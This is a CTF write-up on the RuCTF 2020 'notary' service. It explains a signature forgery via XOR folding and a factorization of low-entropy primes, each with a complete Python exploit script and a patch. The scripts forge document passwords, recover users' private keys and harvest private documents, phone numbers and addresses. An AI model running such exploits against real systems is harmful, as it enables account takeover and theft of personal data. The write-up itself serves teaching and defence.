+++
title = 'RuCTF 2020 — notary'
date = 2020-12-26T23:37:48+03:00
tags = ['ctf', 'writeup', 'crypto']
toc = true
tldr = 'detect the low-entropy PRNG and attack the KMOV cryptosystem'
+++

## Overview

**Notary** is a web service designed as a notary center:

![docs](docs.png)

All users have their own public and private keys, which are required for signing documents and verifying signatures. Each document has a visibility property and may be protected with a password. But the document owner always can view the document content:

![public_doc](public_doc.png)

![private_doc](private_doc.png)

Also, some sensitive information about user (ex. Phone number and Address) is private and can not be visible for others:

![public_user](public_user.png)

![private_user](private_user.png)

Our goal is be able to:

- get the private document password to view its content
- get the user password to view its sensitive data

The web service itself is written in Python and using the external custom cryptographic library for digital signatures.

- Web service source code: [link](https://github.com/HackerDom/ructfe-2020/tree/main/services/notary/notaryserver)
- `libnotary.so` source code: [link](https://github.com/HackerDom/ructfe-2020/tree/main/services/notary/libnotary)

The source code of `libnotary.so` was not provided.

## libnotary description

All vulnerabilities was located in `libnotary.so`, so I will describe it a bit. There was implemented KMOV algorithm: an RSA-like algorithm based on elliptic curves. Below is a screenshot from the paper [On the Security of the KMOV Public Key Cryptosystem](https://www.iacr.org/cryptodb/data/paper.php?pubkey=1033) by Daniel Bleichenbacher:

![kmov](kmov.png)

The security of KMOV, as of RSA, based on integer factorization. If we found such $p$ and $q$ that $N = p \cdot q$, we will be able to forge the signature.

## Vulnerability 1: XOR

Look at the `__sign_data_to_point` function located in file [sign.c](https://github.com/HackerDom/ructfe-2020/blob/main/services/notary/libnotary/src/sign.c). There is a code that performs a transformation from the binary data to a elliptic curve point:

```c
void __sign_data_to_point(point_ptr point, mpz_srcptr N, size_t data_size, const uint8_t *data) {
    mpz_t x, y;
    size_t coord_length, value_length;
    uint8_t *value;

    coord_length = (mpz_sizeinbase(N, 2) + 7) / 8;
    value_length = 2 * coord_length * sizeof(uint8_t);

    value = malloc(value_length);
    memset(value, 0xFF, value_length);

    for (size_t i = 0, j = 0; i < data_size; i++, j++) {
        if (j == value_length) {
            j = 0;
        }

        value[j] ^= data[i];
    }

    mpz_inits(x, y, NULL);

    mpz_import(x, coord_length, LSB_FIRST, sizeof(uint8_t), NATIVE_ENDIANNESS, 0, value);
    mpz_import(y, coord_length, LSB_FIRST, sizeof(uint8_t), NATIVE_ENDIANNESS, 0, value + coord_length);

    // x = x % N
    mpz_mod(x, x, N);

    // y = y % N
    mpz_mod(y, y, N);

    mpz_set(point->x, x);
    mpz_set(point->y, y);

    mpz_clears(x, y, NULL);

    free(value);
}
```

What does it mean? 

Let's imagine that we have the modulus $N$ size of `length` bytes and the binary array `data`. We need to transform the `data` array to a point with coordinates $x$ and $y$ (each size of `length` bytes). The code just XORs each data block of length `2 * length` and then splits it on two subarrays with length `length`, which will be be transformed into integers.

```python
result = data[0:2*length] ^ data[2*length:4*length] ^ ...  # len(result) == 2 * length
x, y = result[:length], result[length:]
```

It's obviously that if we can control the `data` array, we can obtain arbitrary elliptic curve point, just doing some XOR operations. But how it can be used?

According to [models.py](https://github.com/HackerDom/ructfe-2020/blob/main/services/notary/notaryserver/models.py), the password of each document is just a signature of the special object, where `document_id` is an identificator of the document:

```python
{
    'title': 'document_id',
    'text': document_id
}
```

Since this is an object, we can insert additional field (ex. called `garbage`) and store there arbitrary bytes, because it will be ignored. So, now we can construct an elliptic curve point from the `document_id`. How we can sign it using only public key?

Let's take arbitrary point $Q(x, y)$, it will be our _forged signature_ and create a curve $Curve = EllipticCurve(0, b, N)$, where $N$ is a public key modulus, and $b$ is a variable from KMOV paper (described above). Then calculate another point $P = Q \cdot e$, where $e$ is a public key exponent. Now $P$ is our _plaintext_, since $Q = P \cdot d$ is the signature.

Remember that we can create arbitrary point for known `document_id` using `garbage` field? So we can create an object which will be mapped to point $P$:

```python
{
    'title': 'document_id',
    'text': document_id,
    'garbage': '..............'
}
```

And we know $P$'s signature, it's $Q$! Now just pack it correctly, send to the server and read the private document text.

Example sploit:

```python
#!/usr/bin/env python3

import sys
import string
import struct
import random
import msgpack
import requests

import parse
import notary


def find_pair(x):
    alpha = set(map(ord, string.ascii_letters + string.digits)) ^ set(range(128, 256))

    for y in alpha:
        if x ^ y in alpha:
            return y, x ^ y


def forge_data(expected, length, prefix, suffix):
    prefix = prefix.ljust(2 * length, b'X')
    suffix = suffix.rjust(2 * length, b'X')

    blocks = [[], []]

    for x, y, z in zip(prefix, suffix, expected):
        pair = find_pair(x ^ y ^ z ^ 0xFF)

        for block, value in zip(blocks, pair):
            block.append(value)

    return prefix + b''.join(map(bytes, blocks)) + suffix


def forge_signature(public, prefix, suffix):
    length = (public.N.bit_length() + 7) // 8

    signature = notary.Point(
        random.randrange(2, public.N - 2),
        random.randrange(2, public.N - 2)
    )

    curve = notary.Curve.from_point(signature, public.N)
    data_point = notary.Elliptic.multiply(signature, public.e, curve)
    expected = notary.Hash.point_to_data(data_point, public.N)

    data = forge_data(expected, length, prefix, suffix)

    return data, signature


def generate_password(public_key, document_id):
    public = notary.Public.unpack(public_key)

    length = (public.N.bit_length() + 7) // 8
    
    obj = {
        'title': 'document_id',
        'text': str(document_id),
        'garbage': None
    }

    prefix = msgpack.dumps(obj)[:-1]
    garbage_length = 2 * 4 * length - len(prefix) - 3
    prefix += b'\xc5' + struct.pack('>H', garbage_length)

    suffix = b''
    
    fake_data, signature = forge_signature(public, prefix, suffix)

    assert notary.Signature.verify(public, fake_data, signature)

    return f'{notary.Bytes.pack(fake_data)}.{notary.Point.pack(signature)}'


def download_document(url, document_url):
    session = requests.session()

    html = session.get(url + document_url).text
    user_url = parse.Parser(html).author_url()
    
    html = session.get(url + user_url).text
    public_key = parse.Parser(html).public_key()
    
    html = session.get(url + document_url).text
    csrf_token = parse.Parser(html).csrf_token()
    
    document_id = document_url[len('/doc/'):]
    
    password = generate_password(public_key, document_id)
    
    html = session.post(url + document_url, data={'csrf_token': csrf_token, 'password': password}).text
    text = parse.Parser(html).document_text()

    return text


def main():
    IP = sys.argv[1] if len(sys.argv) > 1 else '0.0.0.0'
    PORT = 17171

    url = f'http://{IP}:{PORT}'

    html = requests.get(url).text
    cards = parse.Parser(html).document_cards()

    for document_url, text, _ in cards:
        if 'Private document' in text:
            content = download_document(url, document_url)
            print(document_url, content)


if __name__ == '__main__':
    main()
```

To patch the vulnerability just prohibit objects with additional ignored fields.

Example patch:

```diff
diff --git a/services/notary/notaryserver/notary.py b/services/notary/notaryserver/notary.py
index 53ede5c2..cd1abed1 100644
--- a/services/notary/notaryserver/notary.py
+++ b/services/notary/notaryserver/notary.py
@@ -29,6 +29,10 @@ def pack_document(title, text):
 def load_document(document_data):
     try:
         document = msgpack.loads(document_data)
+        
+        if len(document.items()) > 2:
+            raise ValueError
+
         return document['title'], document['text']
     except (ValueError, KeyError):
         raise ValueError('Failed to load document')
```

## Vulnerability 2: Factorization

It would be better if we could factorize the public key modulus $N = p \cdot q$. If we could do it, we could recover the user's private key and create the password.

Let's look at the `__private_generate_prime` function located in file [private.c](https://github.com/HackerDom/ructfe-2020/blob/main/services/notary/libnotary/src/private.c). It uses GMP MT19937 random generator to obtain random numbers, but here is a typo:

```c
void __private_generate_prime(mpz_ptr prime, size_t bits, FILE *random) {
    const int32_t checks = 10;

    mpz_t result, remainder;
    uint64_t seed;
    gmp_randstate_t state;

    fread(&seed, sizeof(uint64_t), 1, random);

    gmp_randinit_mt(state);
    gmp_randseed_ui(state, seed);

    mpz_inits(result, remainder, NULL);

    do {
        mpz_rrandomb(result, state, bits);
        mpz_mod_ui(remainder, result, 3);
    } while (mpz_probab_prime_p(result, checks) == 0 || mpz_cmp_ui(remainder, 2) != 0);

    mpz_set(prime, result);

    mpz_clears(result, remainder, NULL);
    gmp_randclear(state);
}
```

The vulnerable function is `mpz_rrandomb`. It still generates random numbers, but these numbers have a very low entropy. The binary representation of numbers contains a long strings of ones and zeroes. For example, here is a 1024-bit number generated using `mpz_rrandomb`:

```python
0b1111111111111111111111111000000000000000000000000000000000000000000000000000000000000000000111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111110000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000011111111111111111111111111111111111111111111111111111111111111111111111110000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000011111111
```

Since we know this, we can effectively factorize $N = p \cdot q$, using [Helsel's lifting](https://en.wikipedia.org/wiki/Hensel%27s_lemma) method. 

Let's state that $p_i$, $q_i$ and $N_i$ are $i$ least significant bits of $p$, $q$ and $N$ respectively. We would iterate over $i$ and collect all possible solutions on each step.

The first $(p_1, q_1)$ pair is $(1, 1)$, because $1 \cdot 1 == 1 \pmod{2^1}$ (and $N$ is always odd). 

Then, incrementing $i$, we would get $4$ possible pairs:

```python
[
    (01, 01),
    (01, 11),
    (11, 01),
    (11, 11)
]
```

We need to select only such pairs that $p_2 \cdot q_2 = N_2$ ($p \cdot q = N \pmod{2^2}$). When we select these pairs, we could increment $i$ again and move to the next step.

In general case it is an exponential solution, since on each step it multiplies the number of possible solutions. But we know, that the primes entropy is low, and we can apply some heuristic. 

Let's define a function $H(n)$, it equals to the count of switches $0 \rightarrow 1$ and $1 \rightarrow 0$ in the binary representation of $n$. For example, if $n = 1111100000011111000$, $H(n) = 3$. On each step we need to select only $K$ possible solutions $(p, q)$ with lowest values of $H(p) + H(q)$. Since we know that $H(n)$ is low in our case, it remains only the most likely solutions.

One can imagine this algorithm as a [Breadth-first search](https://en.wikipedia.org/wiki/Breadth-first_search) on a tree with nodes $(p_i, q_i)$ and root $(1, 1)$. On each step it adds 4 subnodes to each node and removes subgraphs with _too high_ entropy.

When factorization $N = p \cdot q$ is known, we just need to generate user's password and login.

Example sploit:

```python
#!/usr/bin/env python3

import sys
import math
import gmpy
import bisect
import requests

import parse
import notary


def count_splits(bits, n):
    s = bin(n)[2:].zfill(bits)
    count = 0
    previous = s[0]
    for i in range(1, len(s)):
        if s[i] != previous:
            count += 1
            previous = s[i]
    return count


def find_next_solutions(k, n, previous_solutions):
    solutions = []
    visited = set()

    mod = 1 << k
    n_part = n % mod

    for _, p, q in previous_solutions:
        p2 = p + mod
        q2 = q + mod
        n1 = (p * q) % mod
        n2 = (p2 * q) % mod
        n3 = (p * q2) % mod
        n4 = (p2 * q2) % mod

        for _p, _q, _n in [(p, q, n1), (p, q2, n2), (p2, q, n3), (p2, q2, n4)]:
            if _n == n_part and (_p, _q) not in visited:
                weight = count_splits(k, _p) + count_splits(k, _q)  
                bisect.insort(solutions, ((weight, _p, _q)))
                visited.add((_p, _q))
                visited.add((_q, _p))

    return solutions


def factorize_limited(bits, n, limit):
    solutions = [(2, 1, 1)]

    for k in range(1, bits - 1):
        solutions = find_next_solutions(k, n, solutions)[:limit]

    for _, p, q in solutions:
        p2 = p + (1 << (bits - 1))
        q2 = q + (1 << (bits - 1))

        if n % p2 == 0:
            return p2, n // p2
        if n % q2 == 0:
            return q2, n // q2


def factorize(n, start_limit=10):
    bits = math.ceil(math.log2(n)) // 2
    limit = start_limit

    while True:
        factor = factorize_limited(bits, n, limit)
        if factor is not None:
            return factor
        limit *= 2


def recover_private_key(public):
    p, q = factorize(public.N)
    phi = (p + 1) * (q + 1)
    d = int(gmpy.invert(public.e, phi))
    private = notary.Private(public.N, p, q, public.e, d)
    assert private.is_valid()
    return private


def recover_user_credentials(url, user_url):
    html = requests.get(url + user_url).text

    username = parse.Parser(html).username()

    public_key = parse.Parser(html).public_key()
    public = notary.Public.unpack(public_key)

    private = recover_private_key(public)

    password = notary.Signature.create(private, username.encode('utf-8'))

    return username, notary.Bytes.pack(password)


def main():
    IP = sys.argv[1] if len(sys.argv) > 1 else '0.0.0.0'
    PORT = 17171

    url = f'http://{IP}:{PORT}'

    html = requests.get(url).text
    cards = parse.Parser(html).document_cards()

    for document_url, text, user_url in cards:
        username, password = recover_user_credentials(url, user_url)

        session = requests.session()

        html = session.get(url + '/login').text
        csrf_token = parse.Parser(html).csrf_token()

        profile = session.post(url + '/login', data={'csrf_token': csrf_token, 'username': username, 'password': password}).text

        parser = parse.Parser(profile)
        phone = parser.phone()
        address = parser.address()

        print(username, phone, address)

        if 'Private document' in text:
            html = session.get(url + document_url).text
            content = parse.Parser(html).document_text()
            
            print(document_url, content)


if __name__ == '__main__':
    main()
```

To patch this vulnerability just replace `mpz_rrandomb` with `mpz_urandomb` which is more secure.

Example patch: 

```
sed -i 's/mpz_rrandomb/mpz_urandomb/g' libnotary.so
```
